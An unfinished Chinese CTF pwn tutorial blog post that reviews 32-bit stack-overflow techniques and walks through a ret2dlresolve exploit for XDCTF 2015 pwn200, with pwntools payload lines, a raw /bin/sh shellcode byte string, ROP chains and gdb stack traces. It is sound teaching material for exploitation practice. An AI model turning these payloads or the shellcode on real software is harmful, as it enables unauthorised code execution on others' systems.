---
layout: post
title: " 从壹开始做ret2dlresolve "
date: 2019-04-02
excerpt: "就是从怎么找offset开始说的意思（正在施工）"
tags: [pwn]
feature:  https://p0.ssl.qhimg.com/t01a969a8d998ad5508.png
comments: true
---

# 从壹开始做ret2dlresolve

注意：full relro 的binary 是不会延迟绑定的……也意味着无法修改got表……

先上一张图（并没有劝退的意思）

![](https://raw.githubusercontent.com/RhythmMark/RhythmMark.github.io/master/_posts/pictures/ELF_dlresolve.jpg)

好的我已经画得很清楚了，告辞（×）

（图中的bof暴露了我还在啃[Return-to-dl-resolve](http://pwn4.fun/2016/11/09/Return-to-dl-resolve/)

---

首先……时隔差不多半年没做pwn，我觉得我有必要回忆一下做pwn题基础知识……

写exp一般要用到的：

```python
from pwn import *
context.log_level = 'debug'
#io = remote('xxx.xxx.xxx.xx',xxxxx)
io = process('./binary')
...
gdb.attach(io)
...
```

然后下面用 **五条payload** 来回忆栈溢出

### 0x1（返回地址至flag） 的场合

``payload = 'A'*(0x108+0x04)+pack(0x0804856B)``

其中``0x108``是binary给输入分配的空间的大小，用ida看的话一般是``sub     esp, 108h``这里的那个数字……``0x04``是``ebp``，不知道ebp是什么的去学习下函数调用栈……

可以参考：[ctfwiki-linux pwn-栈介绍](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack-intro/)

这两个加起来，即``0x108+0x04``的大小，下称``offset``或``pattern``或``padding``，意为到返回地址的偏移，达成伪造返回地址的填充之类的……

一般来说……

``gdb binary``
用gdb加载要pwn的binary

``pattern create 200``
创建一个长度为200的pattern

然后会出现

``AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA``

复制下来……

``r``运行……停在等待用户输入的地方……

粘贴pattern……``c``继续运行……

然后……binary就会崩溃……出现

```
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
00x41414641 in ?? ()
gdb-peda$ 
```

之类的……

（因为``0x41414641``应该是返回地址……binary正准备去执行那个地址的命令……但是被填充了奇怪的东西上去……所以就崩了……）

然后……提取里面的``0x41414641``……

执行``pattern offset 0x41414641``……

会出现……``1094796865 found at offset: 44``


那……offset就是44了……（已包含ebp……好像越说越乱（×））

或者……用Cyclic pattern的话……可能显得没那么蠢……whatever

所以``pack(0x0804856B)``就是我们伪造的返回地址。发送这条payload，没开什么保护、一切顺利的话，就会执行``pack(0x0804856B)``处的命令。

### 0x2（返回地址至shellcode）（已知buf位置） 的场合

``payload = shellcode + 'A' * (44 - len(shellcode)) + p32(ret)``

类似0x1，``shellcode + 'A' * (44 - len(shellcode))``都是``pattern``，``ret``应该是buf的地址，而buf在我们进行输入之后，里面的内容就是``payload = shellcode + 'A' * (44 - len(shellcode)) + p32(ret)``，所以会执行shellcode……

shellcode可以用：

```
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"
"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
```

### 0x03 (return-to-libc attack)（已知gets地址） 的场合

```
payload = padding + p32(systemaddr) + p32(ret)                 + p32(binshaddr)
          pattern    system()地址      执行system()后的返回地址      system()的参数         
```

因为当调用一个函数的时候，栈一般长这样：

``[局部变量|ebp|返回地址|参数]``

我们把被害函数（就请求用户输入的那个……read之类的）的返回地址伪造成``systemaddr``之后，就会执行``system()``，此时binary就以为自己是在调用``system()``

就以为栈里面的数据就是：
```
system()的局部变量  ebp                      返回地址           参数 
padding         +       p32(systemaddr) +  p32(ret)        + p32(binshaddr)
                             ↑
```
第一行是binary误以为的，第二行是我们伪造的，第三行是表示“这是正在执行这条命令时候的示意图”……

所以这个payload会让binary执行``system("/bin/sh")``√

注：因为``int system(const char *command)``，所以参数那里是字符串地址而不是字符串

更多的可以参考：[frame-faking-介绍-函数调用伪造](http://turingh.github.io/2016/01/27/frame-faking/
)

### 0x04 未知gets地址，需要别的ROP 的场合

注：buf应该在一个 **可读可写可执行** 的地方

```
                        read()      |read的返回地址|   |   read   的    参    数    |
payload1 = pattern + p32(sys_read) +    p32(buf)    +  p32(0) + p32(buf) + p32(0x80)

payload2 = shellcode

```

首先read函数：``ssize_t read(int fd, void * buf, size_t count);``

因此这两个payload，发送``payload1``之后，binary执行``read(0,buf,0x80)``，即从文件标识符为0的标准输入中，获取80个字节长度的内容，将其读入buf这个地址中。

此时会等待用户输入，然后我们发送payload2，``shellcode``。

而read函数的返回地址正是``buf``的地址，因此buf上的``shellcode``会被执行。


### 0x05 开了NX+ASLR，需要先泄露puts在got表中的地址，再进行ret2libc 的场合

这里只说怎么泄露puts在got表中的地址

注1：ASLR 会使堆、栈、libc的地址发生变化，但它不负责代码段以及数据段的随机化工作，这项工作由 PIE 负责，而PIE只有在ASLR开启之后才会生效。（所以puts函数的地址可以在ida里找……这就是下面payload中``puts_addr_ida``的意思（。））

注2：即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。

注3：由于可能会有延迟绑定，因此泄露的函数必须已被使用，不然got表中存放的是puts@plt下一条指令的地址……好像回到正题了

这里只给出泄露payload：

``payload = pattern + p32(puts_addr_ida)+rett+p32(puts_got)``

rett用main函数地址就行了，也是在ida里找

接下来就跟0x03差不多了

我觉得复习得差不多了，下面开始dlresolve。

![](https://github.com/RhythmMark/RhythmMark.github.io/blob/master/_posts/pictures/tryit.jpg?raw=true)

---
先推荐一篇文章：

[《How the ELF Ruined Christmas》](https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/di-frederico)

当然可以在这里看到它的中文译文：

[ELF如何摧毁圣诞 ——通过ELF动态装载机制进行漏洞利用](https://www.inforsec.org/wp/?p=389)


---

## 一些前置知识：

### 0x0

ret：pop eip

leave：mov esp,ebp;pop ebp

### 0x1

#### [stack pivoting ](http://tacxingxing.com/2017/05/10/stack-pivot/)

![](http://tacxingxing.com/wp-content/uploads/2018/01/15136516601572.jpg)

### 0x2 

买五赠一，附送一个[XDCTF 2015 的 pwn200](http://pwn4.fun/2016/11/09/Return-to-dl-resolve/)的payload讲解

``payload = pattern + read_plt + ppp_ret + 0 + base_stage + 100 + pop_ebp_ret + base_stage + leave_ret``

执行 read(0,base_stage,100)，将100长度的内容读入base_stage

**！！强烈推荐用gdb看，在stage1脚本的``payload2 += 'A' * (100 - len(payload2))``加个``gdb.attach(r)``，运行，然后慢慢``ni``（单步执行，遇到函数调用不进入该函数）就很清楚了**

（这是看读入payload2后发生的事，同理要看读入payload后发生的事就在``29 r.sendline(payload)``前加``gdb.attach(r)``）

这个payload比之前提到的都要长，但问题不大

首先执行``read(0,base_stage,100)``。为了和最开始的read()函数区分，下面把这个我们在payload1中伪造的read称为read1()

从标准输入读入100个bytes至base_stage

因为接下来将会发送payload2，所以是把payload2填入base_stage。这里的base_stage在bss段，是可写的，在gdb中用``vmmap``也能看到（每块内存地址的permission什么的）

读完payload2，binary准备执行``=> 0xf7ebcce3 <read1+51>:	ret``的时候，此时的栈是这样子的：

```
0000| 0xffc83ae0 --> 0x8048619 (<__libc_csu_init+89>:	pop    esi)
0004| 0xffc83ae4 --> 0x0 
0008| 0xffc83ae8 --> 0x804a840 ("AAAAЃ\004\bAAAA\001")
0012| 0xffc83aec --> 0x64 ('d')
0016| 0xffc83af0 --> 0x804861b (<__libc_csu_init+91>:	pop    ebp)
0020| 0xffc83af4 --> 0x804a840 ("AAAAЃ\004\bAAAA\001")
0024| 0xffc83af8 --> 0x8048458 (<deregister_tm_clones+40>:	leave)
...
```
又知道，``ret``就是``pop eip``，所以接下来程序会将``0000| 0xffc83ae0 --> 0x8048619 (<__libc_csu_init+89>:	pop    esi)`` pop 到eip，而eip指向的是“将要执行的下一条指令”。

所以执行``ret``后，

将要执行的代码长这样：

```
=> 0x8048619 <__libc_csu_init+89>:	pop    esi
   0x804861a <__libc_csu_init+90>:	pop    edi
   0x804861b <__libc_csu_init+91>:	pop    ebp
   0x804861c <__libc_csu_init+92>:	ret    
   0x804861d:	lea    esi,[esi+0x0]
```

栈长这样：

```
0000| 0xffc83ae4 --> 0x0 
0004| 0xffc83ae8 --> 0x804a840 ("AAAAЃ\004\bAAAA\001")
0008| 0xffc83aec --> 0x64 ('d')
0012| 0xffc83af0 --> 0x804861b (<__libc_csu_init+91>:	pop    ebp)
0016| 0xffc83af4 --> 0x804a840 ("AAAAЃ\004\bAAAA\001")
0020| 0xffc83af8 --> 0x8048458 (<deregister_tm_clones+40>:	leave)
```

然后顺其自然地，执行到``=> 0x804861c <__libc_csu_init+92>:	ret``的时候
```
...
ESI: 0x0 
EDI: 0x804a840 ("AAAAЃ\004\bAAAA\001")
EBP: 0x64 ('d')
```

此时栈长这样：

```
0000| 0xffc83af0 --> 0x804861b (<__libc_csu_init+91>:	pop    ebp)
0004| 0xffc83af4 --> 0x804a840 ("AAAAЃ\004\bAAAA\001")
0008| 0xffc83af8 --> 0x8048458 (<deregister_tm_clones+40>:	leave)
...
```
同理，接下来会执行：pop ebp; ret

因为
```
gdb-peda$ x/5i 0x804861b
   0x804861b <__libc_csu_init+91>:	pop    ebp
=> 0x804861c <__libc_csu_init+92>:	ret
```

所以成功使：``EBP: 0x804a840 ("AAAAЃ\004\bAAAA\001")``

且``EIP: 0x8048458 (<deregister_tm_clones+40>:	leave)``

又知，``leave``即``mov esp,ebp; pop ebp``，执行``leave``之后

``ESP: 0x804a844 --> 0x80483d0 (<write@plt>:	jmp    DWORD PTR ds:0x804a01c)``

我们就成功地把stack转移到bss段里，即我们payload2的地方了

此时的stack如下：

```
0000| 0x804a844 --> 0x80483d0 (<write@plt>:	jmp    DWORD PTR ds:0x804a01c)
0004| 0x804a848 ("AAAA\001")
0008| 0x804a84c --> 0x1 
0012| 0x804a850 --> 0x804a890 ("/bin/sh")
0016| 0x804a854 --> 0x7 
0020| 0x804a858 ('A' <repeats 56 times>, "/bin/sh")
0024| 0x804a85c ('A' <repeats 52 times>, "/bin/sh")
0028| 0x804a860 ('A' <repeats 48 times>, "/bin/sh")
```

接下来执行ret，即 ``pop eip``，即执行write(1,(base_stage+10)_addr,7)，即把位于base_stage+10的cmd '/bin/sh'写入标准输出。

因此运行这个输出/bin/sh。（看不到的话在脚本里开下``context.log_level = "debug"``）

顺水推舟（？）讲下stage2 到 6 做了什么吧。主要就是修改payload2，达到：

>1.控制eip为PLT[0]的地址，只需传递一个index_arg参数
2.控制index_arg的大小，使reloc的位置落在可控地址内
3.伪造reloc的内容，使sym落在可控地址内
4.伪造sym的内容，使name落在可控地址内
5.伪造name为任意库函数，如system

的目的

#### stage6

```
payload2 = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'AAAA'
payload2 += p32(base_stage + 80)
payload2 += 'aaaa'
payload2 += 'aaaa'
payload2 += fake_reloc # (base_stage+28)的位置
payload2 += 'B' * align
payload2 += fake_sym # (base_stage+36)的位置
payload2 += "system\x00"
payload2 += 'A' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))
```

建议把最开始放的那张图打印出来对着看（不

plt[0]存放的是：

```
push    ds:dword_804A004
jmp     ds:dword_804A008
```
而jmp的地址就是``_dl_runtime_resolve()``函数的地址

所以会执行_dl_runtime_resolve(link_map,reloc_arg)

而这里的``reloc_arg``就是``payload2 += p32(index_offset)``中的``index_offset``

又因为

``index_offset = (base_stage + 28) - rel_plt``

所以，执行``_dl_runtime_resolve()``的时候——

请读者自行理解。

## Start

由于出题人 **过于友好**，我手上的这道题，buf大小为0x28，读入0x40个字符，即只溢出了**24**个bytes，不能像上面那道题一样一上来就能发送0x4d大小的字符串……

那怎么办呢，那我就跑路了（×）

![](http://5b0988e595225.cdn.sohucs.com/images/20181021/54c568f78c4f4cf5839215ff92430f52.gif)

江湖不见

想知道怎么做看[这里](https://delcoding.github.io/2019/01/ret2dl_resolve_x86/)好了

